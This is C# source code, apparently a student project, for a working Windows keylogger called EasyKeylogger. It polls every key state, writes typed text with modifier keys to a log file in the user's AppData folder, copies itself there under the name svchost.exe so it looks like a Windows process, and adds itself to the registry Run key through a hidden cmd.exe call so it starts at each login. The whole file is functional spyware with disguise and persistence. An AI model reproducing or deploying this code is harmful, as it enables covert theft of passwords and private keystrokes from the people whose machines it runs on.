//Alejandro Amaro Buyo 100330530
//Keylogger using a polling strategy with GetAsyncKeyState.
//We have created an executable, and it will copy itself to another location and create a key in the registry to be present in the init of the system.
//Actually it works better in a US keyboard, but we will develop a specific translation for the ASCII keys, or postprocess the log file to extract the valuable information.


using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
//This library is just for US keyboard, we should create another mapping for another languages of the Keyboard
using System.Windows.Forms;

namespace EasyKeylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(Keys vKey);

        //We create mutex to avoid multiple instances of the file
        private static Mutex mut;
        static bool isPressed(Keys key)
        {

            return GetAsyncKeyState(key) != 0;
        }
        static void Main(string[] args)
        {
            try
            {
                //If the mutex exists we will close the execution.(We should change the name of the mutex)
                Mutex.OpenExisting("Easy_keylogger");
                Environment.Exit(0);
            }
            catch
            {
                //If the mutex doesn't exist this line create a new line.
                mut = new Mutex(true, "Easy_keylogger");
            }

           
            Autoinstaller();
            //We introduce a break line between executions of the program
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\log.txt", "\nNewSession\n");
            String log = "";
            int cc = 0;
            while (true)
            {

                //We capture keys each 100 ms
                Thread.Sleep(100);
                for (int i = 0; i <= 255; i++)
                {


                    if (isPressed((Keys)i))
                    {
                                              
                        //Jump (break line)
                        if (i == 13)
                        {
                            log += "\n";
                        }
                        //Space
                        else if (i == 32)
                        {
                            log += " ";
                        }

                        else
                        {
                            //Special Characters previous 48(not modifiers). (Rest of them we eliminated of the log)
                            if (i == 27 || i == 9 || i == 8 || i == 20)
                            {

                                log += " [" + (Keys)i + "] ";
                            }
                            
                            //Characters from '0-9 && a to Z' 
                            
                            else if (i >= 48 && i <= 90)
                            {
                                string x = ((char)i) + "";
                                //We save if there is some modifier previously
                                if ((Control.ModifierKeys & Keys.Alt) == Keys.Alt)
                                {
                                    log += ("[ALT+" + x + "]");
                                }
                                else if ((Control.ModifierKeys & Keys.Control) == Keys.Control)
                                {
                                    log += ("[CTRL+" + x + "]");
                                }
                                else if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift && i<65)
                                {
                                    log += ("[SHIFT+" + x + "]");
                                    
                                }
                                else {
                                //We check if is pressed SHIFT or CAPS LOCK and in the other hand that no are pressed shift when is activated CAPS LOCK
                                if (Control.IsKeyLocked(Keys.CapsLock) && (Control.ModifierKeys & Keys.Shift) == Keys.Shift ||
                                    !Control.IsKeyLocked(Keys.CapsLock) && (Control.ModifierKeys & Keys.Shift) != Keys.Shift)
                                    {
                                        x = x.ToLower();
                                    }
                                
                                    log += x; }
                            }
                            //We save if there is some modifier key pressed
                            else if((Control.ModifierKeys & Keys.Shift) == Keys.Shift && (i!=16 && i!=160)) {
                                log+=("[SHIFT+"+(Keys)i+"]");
                            }
                            else if((Control.ModifierKeys & Keys.Alt) == Keys.Alt && (i != 18 && i != 164)) {
                                log+=("[ALT+" + (Keys)i + "]");
                            }
                            else if ((Control.ModifierKeys & Keys.Control) == Keys.Control && (i != 17 && i != 162)){
                                log+=("[CTRL+" + (Keys)i + "]");
                            }
                            //Rest of situations
                            else if (i >= 91 && i!=160 && i != 164 && i != 162)
                            {

                                //We could print the other characters. For a future analysis of the log avoiding the principal modifiers.
                                log += (Keys)i;
                            }
                        }
                    }
                }
                cc++;
                //We save the logger in the file each 1 segs.
                if (cc > 10)
                {
                      //This have been used for tests
                      //Console.WriteLine("Keylogger:");
                      //Console.WriteLine("\n\n" + log + "\n\n");

                    //We create the log file in C:\Users\(username)\AppData\Roaming\log.txt
                    File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\log.txt", log);
                    //We restart the string to avoid write the same information.
                    log = "";
                    cc = 0;
                }
            }
           
        }
        static void Autoinstaller()
        {
            //First we check if the executable is copied in our desired location.
            if (Application.ExecutablePath == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe")
            {
                //With this method we created a key in the registry (with the name easy_keylogger) to autostart. If it is created we just overwrite it. 
                //Other system could be writing directly in the registry, but we prefered using cmd.
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v easy_keylogger /t REG_SZ /d \"\\\"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe" + "\\\"\"";
                process.StartInfo = startInfo;
                process.Start();

            }
            else
            {
                try
                {
                    //We copy the file to the route: C:\Users\(username)\AppData\Roaming\svchost.exe , we use that name bc is usually in Windows tasks.
                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe", true);
                }
                catch { }
                //We close the mutex before the new execution from the new location, and we close the actual process.
                mut.Close();
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost.exe");
                Environment.Exit(0);
                
            }
            
        }
    }
}
